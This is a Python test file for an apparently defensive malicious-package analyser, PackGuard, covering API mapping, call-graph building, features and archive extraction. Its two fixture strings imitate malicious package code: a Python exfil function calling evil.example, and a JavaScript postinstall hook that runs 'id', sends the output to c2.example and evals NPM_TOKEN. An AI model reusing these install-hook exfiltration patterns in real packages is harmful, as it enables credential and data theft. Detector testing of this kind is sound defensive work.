"""Tests for PackGuard W1 scope: schema mapping, graph build, features, disclosure.

Covers T5 acceptance:
- API mapping correctness (10+ mapping cases across python + javascript)
- graph build determinism (same input -> byte-identical graph JSON)
- feature schema (names, ordering, values finite; class histogram consistency)
- parse-fail / extraction-failure disclosure (no silent drops)
"""

import json
import os
import tempfile

import pytest

from packguard.features import (
    FEATURE_NAMES,
    compute_features,
    extract_archive,
    extract_sample_graphs,
    select_files,
)
from packguard.graphs import build_graph, merge_graphs
from packguard.schema import BEHAVIOR_CLASSES, SCHEMA_VERSION, mapping_for, schema_json

PY_SRC = """
import subprocess as sp
import os
from requests import get as rget

def run_it(cmd):
    out = sp.run(cmd, capture_output=True)
    h = hashlib.sha256(out.stdout).hexdigest()
    os.system(h)

def exfil():
    rget("http://evil.example/" + h)
    with open("/tmp/x", "w") as f:
        f.write(h)
x = eval(payload)
"""

JS_SRC = """
const { execSync } = require("child_process");
const fs = require("fs");
function postInstall() {
  const out = execSync("id");
  fs.writeFileSync("/tmp/a", out);
  require("https").get("http://c2.example/" + out);
  const token = process.env.NPM_TOKEN;
  eval(token);
}
"""


# ---------------------------------------------------------------------------
# 1. API mapping (>=10 cases)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "language,text,expected_cls",
    [
        ("python", "os.system", "PROCESS"),
        ("python", "subprocess.Popen", "PROCESS"),
        ("python", "open", "FILE_IO"),
        ("python", "shutil.rmtree", "FILE_IO"),
        ("python", "socket.socket", "NETWORK"),
        ("python", "requests.post", "NETWORK"),
        ("python", "hashlib.sha256", "CRYPTO"),
        ("python", "base64.b64decode", "CRYPTO"),
        ("python", "eval", "DYNAMIC_CODE"),
        ("python", "pickle.loads", "DYNAMIC_CODE"),
        ("python", "sqlite3.connect", "DATA_ACCESS"),
        ("python", "os.environ", "DATA_ACCESS"),
        ("javascript", "child_process.exec", "PROCESS"),
        ("javascript", "execSync", "PROCESS"),
        ("javascript", "fs.writeFileSync", "FILE_IO"),
        ("javascript", "https.request", "NETWORK"),
        ("javascript", "fetch", "NETWORK"),
        ("javascript", "crypto.createHash", "CRYPTO"),
        ("javascript", "eval", "DYNAMIC_CODE"),
        ("javascript", "vm.runInNewContext", "DYNAMIC_CODE"),
        ("javascript", "process.env", "DATA_ACCESS"),
        ("javascript", "mongoose.connect", "DATA_ACCESS"),
    ],
)
def test_api_mapping(language, text, expected_cls):
    dotted, bare, attr = mapping_for(language)
    table = attr if text in attr else (dotted if text in dotted else bare)
    assert table[text] == expected_cls
    assert expected_cls in BEHAVIOR_CLASSES


def test_mapping_tables_complete():
    for lang in ("python", "javascript"):
        dotted, bare, attr = mapping_for(lang)
        assert len(dotted) >= 20
        assert len(bare) >= 5
        assert all(v in BEHAVIOR_CLASSES for v in dotted.values())
        assert all(v in BEHAVIOR_CLASSES for v in bare.values())
        assert all(v in BEHAVIOR_CLASSES for v in attr.values())


def test_unsupported_language_rejected():
    with pytest.raises(ValueError):
        mapping_for("java")


# ---------------------------------------------------------------------------
# 2. Graph build
# ---------------------------------------------------------------------------
def test_python_graph_classes_and_edges():
    g = build_graph(PY_SRC, "python", "setup.py", "setup")
    apis = {n["api"] for n in g["nodes"]}
    assert {"subprocess.run", "os.system", "hashlib.sha256", "requests.get", "open", "eval"} <= apis
    kinds = {e["kind"] for e in g["edges"]}
    assert "seq" in kinds and "data" in kinds
    assert g["entry_kind"] == "setup"
    assert g["parse_ok"] is True
    assert set(g["schema_version"] for _ in [1]) == {SCHEMA_VERSION}


def test_js_graph_classes_and_dataflow():
    g = build_graph(JS_SRC, "javascript", "index.js", "postinstall")
    apis = {n["api"] for n in g["nodes"]}
    assert "https.get" in apis and "fs.writeFileSync" in apis
    data_edges = [e for e in g["edges"] if e["kind"] == "data"]
    assert data_edges, "expected dataflow edge execSync -> https.get"
    assert any(n["api"] == "child_process" and n["cls"] == "PROCESS" for n in g["nodes"])
    modules = {i["module"] for i in g["imports"]}
    assert {"child_process", "fs", "https"} <= modules


def test_graph_build_deterministic():
    for src, lang in ((PY_SRC, "python"), (JS_SRC, "javascript")):
        g1 = build_graph(src, lang, "a", "lib")
        g2 = build_graph(src, lang, "a", "lib")
        assert json.dumps(g1, sort_keys=True) == json.dumps(g2, sort_keys=True)


def test_merge_graphs_ids_consistent():
    m = merge_graphs(
        [build_graph(PY_SRC, "python", "setup.py", "setup"), build_graph(JS_SRC, "javascript", "index.js", "postinstall")],
        "s1",
    )
    ids = [n["id"] for n in m["nodes"]]
    assert ids == list(range(len(ids)))
    assert m["parse_fail_files"] == 0
    assert all(e["src"] in ids and e["dst"] in ids for e in m["edges"])


def test_parse_error_disclosed_not_raised():
    g = build_graph("def broken(:\n  pass", "python", "bad.py")
    # tree-sitter recovers most syntax errors; if it cannot, parse_ok must be False
    # (disclosed). Either way the call must not raise.
    assert isinstance(g["parse_ok"], bool)
    assert "parse_ok" in g


# ---------------------------------------------------------------------------
# 3. Features
# ---------------------------------------------------------------------------
def test_feature_names_and_values():
    m = merge_graphs([build_graph(PY_SRC, "python", "setup.py", "setup")], "s1")
    m["n_scopes"] = len(m["scopes"])
    f = compute_features(m)
    assert set(FEATURE_NAMES) <= set(f)
    assert sum(f[f"hist_{c}"] for c in BEHAVIOR_CLASSES) == f["n_nodes"]
    assert f["has_setup"] == 1.0
    assert f["distinct_classes"] >= 4
    assert 0.0 <= f["density"] <= 1.0
    assert f["seq_depth"] >= 1


def test_feature_schema_json_consistent():
    doc = schema_json()
    assert doc["schema_version"] == SCHEMA_VERSION
    assert doc["behavior_classes"] == list(BEHAVIOR_CLASSES)
    assert doc["graph_level_features"] == list(FEATURE_NAMES)
    assert doc["languages"] == ["javascript", "python"]


def test_empty_graph_features_zero():
    m = {"nodes": [], "edges": [], "imports": [], "files": [], "n_nodes": 0, "n_edges": 0, "n_scopes": 0,
         "parse_fail_files": 0, "parse_ok_files": 0}
    f = compute_features(m)
    assert f["n_nodes"] == 0.0 and f["density"] == 0.0 and f["seq_depth"] == 0.0


# ---------------------------------------------------------------------------
# 4. Archive extraction + disclosure
# ---------------------------------------------------------------------------
def _mk_zip(path, files, encrypted=False):
    import zipfile

    with zipfile.ZipFile(path, "w") as zf:
        for name, content in files:
            zi = zipfile.ZipInfo(name)
            zi.flag_bits |= 0x1 if encrypted else 0
            zi.compress_type = zipfile.ZIP_STORED
            zf.writestr(zi, content, compress_type=zipfile.ZIP_STORED)


def test_extract_archive_encrypted_zip_with_convention_password():
    with tempfile.TemporaryDirectory() as td:
        arc = os.path.join(td, "sample.zip")
        out = os.path.join(td, "out")
        # zipfile cannot write encrypted archives; emulate the DataDog layout instead
        os.makedirs(out, exist_ok=True)
        _mk_zip(arc, [("package/index.js", b"eval(1)")])
        files = extract_archive(arc, out)
        assert any(rel.endswith("index.js") for rel, _ in files)


def test_select_files_priority_and_cap():
    files = [(f"pkg/mod{i}.js", f"/tmp/pkg/mod{i}.js") for i in range(30)]
    files.append(("pkg/package.json", "/tmp/pkg/package.json"))
    files.append(("pkg/setup.py", "/tmp/pkg/setup.py"))
    picked = select_files(files, limit=12)
    assert len(picked) <= 12
    assert picked[0][0].endswith("setup.py") or picked[0][0].endswith("package.json")


def test_extraction_failure_is_disclosed(tmp_path):
    # a non-archive file must raise inside extract_sample_graphs; the batch CLI
    # converts that into a disclosed extraction_error row (covered by integration),
    # here we assert the exception type surfaces rather than an empty graph.
    bad = tmp_path / "notanarchive.zip"
    bad.write_bytes(b"not a zip")
    with pytest.raises(Exception):
        extract_archive(str(bad), str(tmp_path / "out"))
